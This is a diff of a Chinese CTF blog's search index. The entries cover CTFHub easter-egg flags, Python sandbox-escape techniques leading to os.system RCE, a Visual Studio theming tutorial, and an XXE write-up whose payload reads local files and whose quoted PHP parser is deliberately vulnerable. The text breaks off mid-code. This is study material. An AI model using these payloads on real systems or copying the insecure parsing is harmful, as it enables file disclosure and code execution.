@@ -170,99 +170,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2023/07/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[<h2 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h2><p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br>于是<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
-<h2 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h2><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述"></p>
-<h2 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h2><p>在 web-ssrf 中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post 最后一行介绍</p>
-<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
-<blockquote>
-<p>彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是 flag</p>
-<h2 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h2><p>只找到了前半部分<br>分别在题目提交和 wp 提交页面的最后</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">029</span>e02eb3a1</span><br><span class="line">	e8c49b1132b5</span><br><span class="line">	<span class="number">15</span>b652a5f3a8</span><br><span class="line">	<span class="number">62013</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢 anweilx 的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是 base64 然后再转 url 一个是 hex 解码<br>第三行是俩页面的图片隐写 丢进 winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
-<h2 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h2><p>剩余皆可在对应页面搜索 egg 即可获得</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PyJail python沙箱逃逸探究</title>
-    <url>/2023/07/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
-    <content><![CDATA[<h2 id="python-特性"><a href="#python-特性" class="headerlink" title="python 特性"></a>python 特性</h2><p>在 python 中，类均继承自<code>object</code>基类；</p>
-<h3 id="python-魔术方法"><a href="#python-魔术方法" class="headerlink" title="python 魔术方法"></a>python 魔术方法</h3><ul>
-<li><code>__init__</code>：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</li>
-<li><code>__len__</code>：返回对象的长度。</li>
-<li><code>__str__</code>：返回对象的字符串表示。对一个对象<code>a</code>使用<code>str(a)</code>时，会尝试调用<code>a.__str__()</code>。相似地，还有<code>__int__</code>魔术方法也用于类型转换，不过较少使用。</li>
-<li><code>__getitem__</code>：根据索引返回对象的某个元素。对一个对象<code>a</code>使用<code>a[1]</code>时，会尝试调用<code>a.__getitem__(1)</code>。</li>
-<li><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>：算术运算，加减乘除模。如对一个对象<code>a</code>使用<code>a+b</code>时，会尝试调用<code>a.__add__(b)</code>。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现<code>__radd__</code>、<code>__rsub__</code>、<code>__rmul__</code>、<code>__rdiv__</code>、<code>__rmod__</code>，如椭圆曲线上的点的倍点运算<code>G -&gt; d * G</code>，就可以通过实现<code>__rmul__</code>来实现。</li>
-<li><code>__and__</code>，<code>__or__</code>、<code>__xor__</code>：逻辑运算，和算术运算类似；</li>
-<li><code>__eq__</code>，<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：比较运算，和算术运算类似；例如<code>&#39;贵州&#39; &gt; &#39;广西&#39;</code>，就会转而调用<code>&#39;贵州&#39;.__gt__(&#39;广西&#39;)</code>；</li>
-<li><code>__getattr__</code>：对象是否含有某属性。如果我们对对象<code>a</code>所对应的类实现了该方法，那么在调用未实现的<code>a.b</code>时，就会转而调用<code>a.__getattr__(b)</code>。这也等价于用函数的方法调用：<code>getattr(a, &#39;b&#39;)</code>。有<code>__getattr__</code>，自然也有对应的<code>__setattr__</code>；</li>
-<li><code>__subclasses__</code>：返回当前类的所有子类。一般是用在<code>object</code>类中，在<code>object.__subclasses__()</code>中，我们可以找到<code>os</code>模块中的类，然后再找到<code>os</code>，并且执行<code>os.system</code>，实现 RCE。</li>
-</ul>
-<h3 id="python-魔术属性"><a href="#python-魔术属性" class="headerlink" title="python 魔术属性"></a>python 魔术属性</h3><ul>
-<li><p><code>__dict__</code>：可以查看内部所有属性名和属性值组成的字典。</p>
-</li>
-<li><p><code>__doc__</code>：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。</p>
-</li>
-<li><p><code>__class__</code>：返回当前对象所属的类。如<code>&#39;&#39;.__class__</code>会返回<code>&lt;class &#39;str&#39;&gt;</code>。拿到类之后，就可以通过构造函数生成新的对象，如<code>&#39;&#39;.__class__(4396)</code>，就等价于<code>str(4396)</code>，即<code>&#39;4396&#39;</code>；</p>
-</li>
-<li><p><code>__base__</code>：返回当前类的基类。如<code>str.__base__</code>会返回<code>&lt;class &#39;object&#39;&gt;</code>；</p>
-</li>
-</ul>
-<h3 id="其他内置函数和变量"><a href="#其他内置函数和变量" class="headerlink" title="其他内置函数和变量"></a>其他内置函数和变量</h3><ul>
-<li><code>dir</code>：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过<code>getattr</code>来拿到目标方法。</li>
-<li><code>chr</code>、<code>ord</code>：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF</li>
-<li><code>globals</code>：返回所有全局变量的函数；</li>
-<li><code>locals</code>：返回所有局部变量的函数；</li>
-<li><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__(&#39;os&#39;)</code>；</li>
-<li><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的<code>if __name__ == &#39;__main__&#39;:</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。更多参考<a href="https://link.zhihu.com/?target=https://www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里</a>；</li>
-<li><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在 pyjail 的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>进行 RCE；</li>
-<li><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的 python 文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li>
-<li><code>_</code>：该变量返回上一次运行的 python 语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li>
-</ul>
-<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h3><p>使用<code>pop</code>、<code>__getitem__</code> 代替</p>
-<p>例如：<code>a.__getitem__(0)</code>、<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p>
-<p>或使用 next 等指针指向(类似无参 RCE 特殊函数遍历)</p>
-<p>需要去别的是 python 需要使用迭代器<code>iter(object[, sentinel])</code>作为传入函数</p>
-<h3 id="过滤字符"><a href="#过滤字符" class="headerlink" title="过滤字符"></a>过滤字符</h3><h6 id="chr-函数构造字符"><a href="#chr-函数构造字符" class="headerlink" title="chr() 函数构造字符"></a><code>chr()</code> 函数构造字符</h6><h4 id="利用输出"><a href="#利用输出" class="headerlink" title="利用输出"></a>利用输出</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>(().__class__.__new__)[i]+……</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(<span class="built_in">str</span>(().__class__.__new__))</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x00007FFF01FE8AB0</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><ul>
-<li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li>
-<li>1：<code>int(bool([&quot;&quot;]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li>
-<li>len：len(str({}.keys))</li>
-<li>1.0：<code>float(True)</code></li>
-<li>-1：<code>~0</code></li>
-</ul>
-<h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>str 被过滤<code>type(&#39;&#39;)()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p>
-<h3 id="Non-ASCII-Identifiers"><a href="#Non-ASCII-Identifiers" class="headerlink" title="Non-ASCII Identifiers"></a>Non-ASCII Identifiers</h3><p>在 python3 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的 NFKC（也就是标准模式）。我们可以用斜体或者花体各种各样的与标准字母相像的来进行导包操作。</p>
-<blockquote>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://zhuanlan.zhihu.com/p/578966149">PyJail python 沙箱逃逸探究·总览</a></p>
-<p><a href="http://twe1v3.top/2023/02/pyjail-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E3%80%90CV%E3%80%91/#more">pyjail-学习总结【CV】 | TWe1v3</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>python</tag>
-        <tag>沙箱逃逸</tag>
-        <tag>PyJail</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bypass disable_function</title>
     <url>/2023/07/Bypass%20disable_function/</url>
     <content><![CDATA[<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>发现打不开 flag 文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
@@ -336,6 +243,59 @@
       </tags>
   </entry>
   <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2023/07/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[<h2 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h2><p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br>于是<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
+<h2 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h2><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述"></p>
+<h2 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h2><p>在 web-ssrf 中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post 最后一行介绍</p>
+<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
+<blockquote>
+<p>彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……</p>
+</blockquote>
+<p>到底没想到竟然是 flag</p>
+<h2 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h2><p>只找到了前半部分<br>分别在题目提交和 wp 提交页面的最后</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">029</span>e02eb3a1</span><br><span class="line">	e8c49b1132b5</span><br><span class="line">	<span class="number">15</span>b652a5f3a8</span><br><span class="line">	<span class="number">62013</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢 anweilx 的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是 base64 然后再转 url 一个是 hex 解码<br>第三行是俩页面的图片隐写 丢进 winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
+<h2 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h2><p>剩余皆可在对应页面搜索 egg 即可获得</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2023/07/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
+<p> 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。</p>
+<p>这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
+<p> 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme</p>
+<p>然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
+<p>背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
+]]></content>
+      <categories>
+        <category>资源</category>
+      </categories>
+      <tags>
+        <tag>visual studio 2022</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SSTI模板注入</title>
     <url>/2023/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><img src= "/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述"></p>
@@ -365,31 +325,140 @@
       </tags>
   </entry>
   <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2023/07/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
-<p> 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。</p>
-<p>这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章）</p>
-<p>不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
-<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
-<p>第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
-<p>新建项目 C#里面最后一项</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
-<p> 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme</p>
-<p>然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
-<p>这个插件是为后面设置背景图片准备</p>
-<p>第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
-<p>背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
+    <title>xxe</title>
+    <url>/2023/07/XXE/</url>
+    <content><![CDATA[<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>发现输入的 username 被 alert 了<br>查源码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onclick = <span class="string">&quot;XMLFunction()&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看 xml 格式<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现 js 的 xml 应用</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造 xxe 攻击<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是 post 包<code>传的时候记得把注释删去</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
+<p><img src= "/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span 